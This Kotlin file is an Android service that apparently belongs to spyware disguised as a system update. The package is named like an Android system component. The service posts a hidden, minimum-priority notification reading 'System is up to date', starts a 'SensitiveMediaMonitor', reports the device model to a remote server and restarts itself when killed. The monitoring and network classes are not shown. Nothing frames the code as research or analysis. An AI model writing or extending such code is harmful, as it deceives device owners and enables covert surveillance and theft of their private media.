package com.android.system.update.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.android.system.update.core.NetworkConnectionManager
import com.android.system.update.core.SensitiveMediaMonitor

class MainService : Service() {

    private lateinit var connectionManager: NetworkConnectionManager

    override fun onCreate() {
        super.onCreate()
        connectionManager = NetworkConnectionManager(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()
        val notification = NotificationCompat.Builder(this, "system_update")
            .setContentTitle("System is up to date")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
        startForeground(1, notification)

        SensitiveMediaMonitor(this, connectionManager).startMonitoring()

        val statusData = "{\"event\":\"service_online\", \"model\":\"${Build.MODEL}\"}"
        connectionManager.sync(statusData, "client_info")

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                "system_update",
                "System Update Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}